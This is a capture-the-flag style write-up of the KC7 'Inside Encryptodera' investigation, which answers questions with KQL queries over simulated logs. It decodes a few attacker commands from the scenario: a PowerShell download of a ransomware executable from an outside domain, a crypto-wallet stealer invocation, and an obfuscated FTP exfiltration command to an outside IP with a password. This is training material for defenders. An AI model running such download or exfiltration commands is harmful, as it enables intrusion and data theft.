# Inside Encryptodera

## Before Reading

This writeup doesn't contain detailed explanation of everything and assumes you're already familiar with KQL. My assumption is that you completed [Balloons Over Iowa](...) room, also answer queries are very self-explanatory. <br>
If you are looking for beginner friendly detailed writeup look into the post by [Shinigami42](https://medium.com/@Shinigami42): [KC7: Reflections on “Encryptodera” and Using It to Create a Professional Portfolio](https://medium.com/@Shinigami42/kc7-reflections-on-encryptodera-and-using-it-to-create-a-professional-portfolio-b833eae817a6)

Challenge: [Inside Encryptodera](https://kc7cyber.com/challenges/145#)

## 0: KQL 101

Skipped

## 1: Offensive Odor

### 1: What is Barry's role at the company?

```sql
Employees
| where name == 'Barry Shmelly'
| project role
```

### 2: What is Barry's email address?

```sql
Employees
| where name == 'Barry Shmelly'
| project email_addr
```

### 3: What was the subject of the interesting email (the one on January 16th) that Barry sent?

```sql
Email
| where sender == 'barry_shmelly@encryptoderafinancial.com'
| where monthofyear(timestamp) == 1
| where dayofmonth(timestamp) == 16
| project subject
```

### 4: What was the role of the employees that received Barry's email?

```sql
let mailsSentTo = Email
| where sender == 'barry_shmelly@encryptoderafinancial.com'
| where subject == "I'm not coming in today. I'm sick of this place. We're all getting laid off anyway."
| project recipient;
Employees
| where email_addr in (mailsSentTo)
| distinct role;
```

### 5: What was the role of the recipient of that email?

```kql
let email = Email
| where monthofyear(timestamp) == 1
| where dayofmonth(timestamp) == 18
| where subject == 'YOU ARE A GREEDY PIG!!!! WHAT IS WRONG WITH YOU?????'
| project recipient;
Employees
| where email_addr in (email)
| project role;
```

### 6: What's Barry's IP address? (Paste the full IP address )

```sql
Employees
| where name == 'Barry Shmelly'
| project ip_addr
```

### 7: What was the complete URL that Barry was browsing on his computer regarding Cybersecurity Insiders on the afternoon of December 26th?(Paste the full url)

```sql
OutboundNetworkEvents
| where src_ip == '10.10.0.1'
| where monthofyear(timestamp) == 12
| where dayofmonth(timestamp) == 26
| where url has 'insiders'
```

### 8: What website did he visit first on January 15th? (Paste the full URL)

```kql
OutboundNetworkEvents
| where src_ip == '10.10.0.1'
| where monthofyear(timestamp) == 1
| where dayofmonth(timestamp) == 15 
| where url has 'exe'
```

### 9: Could you provide the full URL for the website Barry searched for USB Flash Drives?

```sql
OutboundNetworkEvents
| where src_ip == '10.10.0.1'
| where url has 'usb'
```
 
### 10: What "secret" document on business transactions did Barry download?

```sql
InboundNetworkEvents
| where src_ip == '10.10.0.1'
| where url has 'secret'
| project parse_path(url).Filename
```

### 11: What document (docx) did Barry download about salaries?

```sql
InboundNetworkEvents
| where src_ip == '10.10.0.1'
| project filename = parse_path(url).Filename
| where filename has 'docx'
```

### 12: What document (zip) did Barry download to get this?

```sql
InboundNetworkEvents
| where src_ip == '10.10.0.1'
| project filename = parse_path(url).Filename
| where filename has 'zip'
```

### 13: Do you know the password he used to zip the files?

```pwsh
➜ 7z.exe --help

7-Zip 22.01 (x64) : Copyright (c) 1999-2022 Igor Pavlov : 2022-07-15

Usage: 7z <command> [<switches>...] <archive_name> [<file_names>...] [@listfile]

<Commands>
    [...]

<Switches>
    [...]
    -p{Password} : set Password
    [...]
```

```sql
ProcessEvents
| where hostname == 'IGOY-DESKTOP'
| where process_commandline has '7z.exe'
| project process_commandline
```

### 14: What is the name of the drive on which Barry stored the final files?

```sql
ProcessEvents
| where hostname == 'IGOY-DESKTOP'
| where timestamp > datetime('2024-01-16T11:00:41Z')
| project process_commandline
```

> Get events after 7z.exe was ran to see activity after.

### 15: Type gotheem to take credit

Title, lol

## 2: Crypto Conquest

### 1: What is the filename of this note?

From the image: _**YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt**_

### 2: What kind of attack is this?

_**[Ransomware](https://www.imperva.com/learn/application-security/ransomware/)** is a type of malware attack in which the attacker locks and encrypts the victim’s data, important files and then demands a payment to unlock and decrypt the data._

### 3: On how many machines was this .txt file seen?

```sql
FileCreationEvents
| where filename == 'YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt'
| distinct hostname
| count 
```

### 4: What time was the ransom note first seen?

```sql
FileCreationEvents
| where filename == 'YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt'
| project timestamp
// | order by timestamp asc // Already Sorted
| take 1
```

### 5: What is the hostname of the system where the ransom note was first seen?

```sql
FileCreationEvents
| where filename == 'YOU_GOT_CRYTOED_SO_GIMME_CRYPTO.txt'
| project hostname
| take 1
```

### 6: How many files were encrypted on this machine?

First manually enumerate for anomalies in filenames and then narrow down:

```sql
FileCreationEvents
| where hostname == 'UL8R-MACHINE'
```

```sql
FileCreationEvents
| where hostname == 'UL8R-MACHINE'
| where filename has '.umadbro'
| count 
```

### 7: What is the extension that was used on the encrypted files?

We learned it from previous answer, Question 6.

### 8: What command was run that references the ransomware extension?

```sql
ProcessEvents
| where hostname == 'UL8R-MACHINE'
| where process_commandline has 'umadbro'
| project process_commandline
```

### 9: When did files_go_byebye.exe appear on this machine?

```sql
FileCreationEvents
| where hostname == 'UL8R-MACHINE'
| where filename == 'files_go_byebye.exe'
| project timestamp
```

### 10: How many commands were run on UL8R-MACHINE during this timeframe?

Query given:

```sql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
```

Answer: 

```sql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| count 
```

### 11: What domain does the encoded PowerShell reference?

```sql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| where timestamp between (datetime("2024-02-16") .. datetime("2024-02-18"))
| where process_name == 'powershell.exe'
| project process_commandline
```

```bash
└─$ echo -n 'cG93ZXJzaGVsbCAtYyAiSW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vbm90aWZpY2F0aW9uLWZpbmFuY2Utc2VydmljZXMuY29tL2ZpbGVzX2dvX2J5ZWJ5ZS5leGUgLU91dEZpbGUgQzpcXFByb2dyYW1EYXRhXFxmaWxlc19nb19ieWVieWUuZXhlIg==' | base64 -d
powershell -c "Invoke-WebRequest -Uri http://notification-finance-services.com/files_go_byebye.exe -OutFile C:\\ProgramData\\files_go_byebye.exe"                                                                       
```

### 12: What command is run right before the base64-encoded PowerShell?

Narrow down search with `process_hash` of malicious pwsh command and **[rows_near](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/rows-near-plugin)** for ease of finding nearby rows.

```sql
ProcessEvents
| where hostname == "UL8R-MACHINE"
| serialize 
| evaluate rows_near(process_hash == '6716595f0a4eeea7c0b4a34312356494c65653cfe6b4776d078bd599ca328842', 1, 0) 
```

### 13: How many devices ran the gpupdate /force command?

[gpupdate](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/gpupdate): Updates Group Policy settings.

```sql
ProcessEvents
| where process_commandline == 'gpupdate /force'
| distinct hostname
| count 
```

### 14: How many machines at Encryptodera ran "systeminfo"?

```sql
ProcessEvents
| where process_commandline == 'systeminfo'
| distinct hostname
| count 
```

### 15: What was the timestamp for the first time the command was run?

```sql
ProcessEvents
| where process_commandline == 'systeminfo'
| project timestamp
| take 1
```

### 16: How many days elapsed between when the attackers ran discovery commands and when the ransomware attack started?

First we need timestamps of when first enumeration and first exploitation happened, we can get them easily because we already encountered the commands to permform said actions.

**[datetime_diff](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/datetime-diff-function)** function can be used to calculate the delta between timestamps.<br>
**[toscalar](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/toscalar-function)** function is used to convert **[dynamic](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/scalar-data-types/dynamic)** type to scalar AKA single value.<br>
**[print](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/print-operator)** operator can be used to show the output.

```sql
let enumeartion = ProcessEvents
| where process_commandline == 'systeminfo'
| project timestamp
| take 1;
let exploitation = ProcessEvents
| where process_commandline == 'gpupdate /force'
| project timestamp
| take 1;
print diffs = datetime_diff('Day', toscalar(exploitation), toscalar(enumeartion))
```

### 17: What is the hostname of the device where the attackers first ran systeminfo?

Modify query from Question 15.

```sql
ProcessEvents
| where process_commandline == 'systeminfo'
| project hostname
| take 1
```

### 18: What was the full commandline used by the threat actor when running nltest /dclist?

Given hostname: `41QI-LAPTOP`

The `nltest /dclist:<DomainName>` command is a Windows command-line utility used to display a list of domain controllers in the specified domain. This command is particularly useful for troubleshooting and obtaining information about the domain controllers available in a given Active Directory domain.

- **[nltest](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731935(v=ws.11))**: This is the main command-line utility for managing and troubleshooting aspects of Windows domains.
- `/dclist`: This parameter is used to specify that the command should retrieve a list of domain controllers.
- `<DomainName>`: Replace this with the actual name of the domain for which you want to obtain the list of domain controllers.

```sql
ProcessEvents
| where hostname == '41QI-LAPTOP'
| where process_commandline has 'nltest /dclist'
| project process_commandline
```

### 19: What is the full name of the .xlsx.exe file on 41QI-LAPTOP?

```sql
ProcessEvents
| where hostname == '41QI-LAPTOP'
| where process_commandline has '.xlsx.exe'
| project process_commandline
```

### 20: What file shows up a few seconds after the .xlsx.exe file? Enter the filename

```sql
ProcessEvents
| where hostname == '41QI-LAPTOP'
| where timestamp > datetime(2024-02-01T08:50:22Z)
| project process_commandline
| take 1
```

> `2024-02-01T08:50:22Z` datetime from Question 19's answer.

### 21: How many devices does screenconnect_client.exe appear on?

```sql
ProcessEvents 
| where process_commandline has 'screenconnect_client.exe'
| distinct hostname
| count
```

### 22: Check the Email logs to see if the .xlsx.exe file was sent in a link. What email address was used to send this file?

```sql
Email
| where link has '.xlsx.exe'
| distinct sender
```

### 23: How many unusual emails were sent by Barry?

1. We need to investigate emails after `2024-02-01` from Barry.
2. As discussed from previous questions attackers hide extension by using double extension. For Windows we are looking for `exe`.
3. Filter for only double extensions. e.g.: '*.docx.exe'

```sql
Email
| where timestamp >= datetime(2024-02-01)
| where link has '.exe'
| where countof(tostring(parse_path(link).Filename), '.') == 2
| count 
```

### 24: Type got it once you've made a note of these recipients.

Title, lol

### 25: What IP was used to sign in to Barry's account on February 1st?

```sql
let barryUsername = toscalar(
    Employees
    | where email_addr == 'barry_shmelly@encryptoderafinancial.com'
    | project username
);
AuthenticationEvents
| where monthofyear(timestamp) == 2 // February
| where dayofmonth(timestamp)  == 1 // 1st
| where username == barryUsername;
```

### 26: How many other accounts did that IP log into?

```sql
AuthenticationEvents
| where src_ip == '143.38.175.105'
```

> Question is about **other accounts**!

### 27: How many IPs logged in to all 8 devices where the attacker ran systeminfo?

I hate how long this question took me to finally realize what it was asking... <!-- It's 2, only 2 ips logged into all 8 devices... -->

```sql
let hosts = ProcessEvents
| where process_commandline has "systeminfo"
| distinct hostname;
AuthenticationEvents
| where hostname in (hosts)
| summarize dcount(hostname) by src_ip
| order by dcount_hostname desc
```

### 28: What is the role of the employee who this IP address belongs to?

Given IP: `10.10.0.138`

```sql
Employees
| where ip_addr == '10.10.0.138'
| project role
```

### 29: How many successful logins were made from this IP?

```sql
AuthenticationEvents
| where src_ip == '10.10.0.138'
| where result == 'Successful Login'
| count 
```

### 30: What is the hostname of the server the attackers logged into?

```sql
AuthenticationEvents
| where src_ip == '10.10.0.138'
| where result == 'Successful Login'
| where hostname has 'SERVER'
```

### 31: Pay Respects

![f](https://i.imgur.com/RhIF5te.jpeg)

## 3: F in the chat

### 1: What username was used to log into the DOMAIN_CONTROLLER_SERVER?

```sql
AuthenticationEvents
| where hostname == 'DOMAIN_CONTROLLER_SERVER'
| project username
```

### 2: What laptop did the lihenry_domain_admin account sign into? (Enter the hostname)

```sql
AuthenticationEvents
| where username == 'lihenry_domain_admin'
```

### 3: What is the MITRE ATT&CK ID for Mimikatz?

_**[Mimikatz](https://attack.mitre.org/software/S0002/)** is a credential dumper capable of obtaining plaintext Windows account logins and passwords, along with many other features that make it useful for testing the security of networks._

### 4: Did the threat actor run mimikatz on this device? If so, enter the command line the attacker ran. If not, enter no

```sql
ProcessEvents
| where hostname == 'GJ95-LAPTOP'
| where process_commandline has 'mimikatz'
```

### 5: Who does this device belong to? (Enter the employee's name)

```sql
Employees
| where hostname == 'GJ95-LAPTOP'
| project name
```

### 6: Was Valerie Orozco targeted in the phishing emails sent from Barry Shmelly?

```sql
let valerieEmail = Employees
| where hostname == 'GJ95-LAPTOP'
| project email_addr;
Email
| where recipient == toscalar(valerieEmail)
| where sender == 'barry_shmelly@encryptoderafinancial.com'
| project subject, link
```

### 7: What is the name of the file that was sent to Valerie in the phishing email?

We learned it from Question 6 query.

### 8: Did Valerie click the link? If so, enter the timestamp when she clicked the link. If not, enter 'no'

```sql
let valerieIP = Employees
| where hostname == 'GJ95-LAPTOP'
| project ip_addr;
OutboundNetworkEvents
| where src_ip == toscalar(valerieIP)
| where url has 'Employee_Contact_List_Updated_March_2024.docx.exe'
```

### 9: How many different user accounts logged into Valerie's machine?

```sql
AuthenticationEvents
| where hostname == 'GJ95-LAPTOP'
| where result == 'Successful Login'
| distinct username
```

### 10: How many unique hosts did this user account attempt to log into?

```sql
AuthenticationEvents
| where username == 'systadmi_local_admin'
| distinct hostname
| count 
```

### 11: Which user NOT in an IT role was improperly using the systadmi_local_admin credentials? (This is likely a sign of compromise)

We are directly given an answer query.

```sql
let hosts = FileCreationEvents
| where filename has "screenconnect"
| distinct hostname;
AuthenticationEvents
| where hostname in (hosts)
| where username has "systadmi"
| where result has "Successful"
| join (
    Employees 
    | project ip_addr,role,email_addr,name
) on $left.src_ip==$right.ip_addr
| project SourceIpName=name, a="who is a", SourceIpUserRole=role, b="logged onto",hostname, c="using", username, d="at",timestamp
```

### 12: When was Robin phished by Barry Shmelly's account?

```sql
let robinEmail = Employees 
| where name == 'Robin Kirby'
| project email_addr;
Email
| where sender == 'barry_shmelly@encryptoderafinancial.com'
| where recipient == toscalar(robinEmail)
| project timestamp
```

## 4: A Network Mystery

### 1: Which IP address received the largest amount of data on Feb 5th?

```sql
NetworkFlow
| where monthofyear(timestamp) == 2
| where dayofmonth(timestamp) == 5
| order by bytes desc 
| take 1
```

### 2: How many bytes of data were sent to that IP on the 5th?

We got information about this question from Question 2.

### 3: When was data first sent to this IP? (paste the full timestamp)

```sql
NetworkFlow
| where dest_ip == '182.56.23.121' // From Question 1
```

### 4: On how many distinct days have we sent data to this IP?

Extract only dates using **[format_datetime](https://learn.microsoft.com/en-us/azure/data-explorer/kusto/query/format-datetime-function)** and then count unique values.

```sql
NetworkFlow
| where dest_ip == '182.56.23.121'
| distinct format_datetime(timestamp, 'yyyy-MM-dd')
| count 
```

### 5: What service is used for the port to which this data is being transferred?

```sql
NetworkFlow
| where dest_ip == '182.56.23.121'
| distinct dest_port
```

***[List of TCP and UDP port numbers](https://www.wikiwand.com/en/List_of_TCP_and_UDP_port_numbers)***

### 6: What is the total amount of data transferred to this IP address?

```sql
NetworkFlow
| where dest_ip == '182.56.23.121'
| summarize sum(bytes)
```

### 7: How many distinct employees have sent data to this IP address?

```sql
NetworkFlow
| where dest_ip == '182.56.23.121'
| distinct src_ip
```

### 8: Whose name is linked to that IP address? Provide the employee's name.

```sql
let susIP = NetworkFlow
| where dest_ip == '182.56.23.121'
| distinct src_ip;
Employees
| where ip_addr == toscalar(susIP)
```

### 9: What is that employee's role?

We got information about this question from Question 8.

### 10: We see her looking for the location of the companys __ __ __ __ (4 words)

```sql
InboundNetworkEvents
| where src_ip == '10.10.0.2'
| where url has 'company'
| where url has 'location'
| project url_decode(url)
```

Crypto Bruh indeed 🤣

### 11: Who was Jane having a suspicious conversation with? (email address)

```sql
Email
| where sender == 'jane_smith@encryptoderafinancial.com'
```

Privacy101...

![writeup.png](/assets/soc/kc7cyber/inside-encryptodera/writeup.png)

### 12: What IP address did the boss man provide to help with smuggling the data?

```sql
Email
| where recipient == 'jane_smith@encryptoderafinancial.com'
| where sender == 'elboss@westealurcrypto.com'
| project subject
```

![writeup.png](/assets/soc/kc7cyber/inside-encryptodera/writeup-1.png)

Bad henchmen... lol

### 13: What is the name of the data exfil tool Jane downloads to help with her operation?

```sql
OutboundNetworkEvents
| where src_ip == '10.10.0.2'
| where url endswith '.exe'
```

### 14: What is the name of the crypto theft tool Jane downloads to help with her operation?

We got information about this question from Question 13.

### 15: To what path does Jane point her data exfiltration tool?

If you filter `ProcessEvents` table for known filenames you will get no results and that's odd. The rogue employee must have used them somehow and we know it jane (username: jasmith).<br>
If you remember Barry he executed encoded payload with powershell, lets look into that.

```sql
ProcessEvents
| where  username == 'jasmith'
| where process_commandline has 'powershell.exe'
| project process_commandline
```

```bash
└─$ echo 'Y3J5cHRvX3N0ZWFsZXIuZXhlIC0tZGFpbHkgLS1pbnB1dCBcXFxcTmV0d29ya1NoYXJlXFxjcml0aWNhbF9pbmZyYXN0cnVjdHVyZVxcQ3J5cHRvX1dhbGxldF9TdG9yYWdlX0xvY2F0aW9uc1xcIC0tb3V0cHV0IEM6XFxVc2Vyc1xcamFzbWl0aFxcVG9UaGVNb29uXFw='
| base64 -d
crypto_stealer.exe --daily --input \\\\NetworkShare\\critical_infrastructure\\Crypto_Wallet_Storage_Locations\\ --output C:\\Users\\jasmith\\ToTheMoon\\
```

### 16: At what tempo does she set the tool to run? (one word)

We got information about this question from Question 15.

### 17: What password does Jane use for the tool?

From Question 15 we can observe a different encoded payload being executed.

```bash
└─$ echo -n 'KCAnXFxub29NZWhUb1RcXGh0aW1zYWpcXHNyZXNVXFw6QyBodGFwLS0gMTIxLjMyLjY1LjI4MSBwaS0tIDEyIHRyb3AtLSAibW9jLmxhaWNuYW5pZmFyZWRvdHB5cmNuZSIgbWl0Y2l2LS0gNURONEhydUZGMHRpM2s0dGxsM3dPVFlSQ2hjdW0ydG9nVSBzc2FwLS0gaHRpbXNhaiByZXN1LS0geWxpYWQtLSBleGUudG5laWxjX3B0ZicgLXNwbGl0ICcnIHwgJXskX1swXX0pIC1qb2luICcn' | base64 -d
( '\\nooMehToT\\htimsaj\\sresU\\:C htap-- 121.32.65.281 pi-- 12 trop-- "moc.laicnanifaredotpyrcne" mitciv-- 5DN4HruFF0ti3k4tll3wOTYRChcum2togU ssap-- htimsaj resu-- yliad-- exe.tneilc_ptf' -split '' | %{$_[0]}) -join ''                                                                     

└─$ echo -n '...' | base64 -d | rev
'' nioj- )}]0[_${% | '' tilps- 'ftp_client.exe --daily --user jasmith --pass Ugot2muchCRYTOw3llt4k3it0FFurH4ND5 --victim "encryptoderafinancial.com" --port 21 --ip 182.56.23.121 --path C:\\Users\\jasmith\\ToTheMoon\\' (
```

> The powershell code is first encoded in Base64 for first level of obfuscation and then it seems to be reversed, the command assembles command and execute it.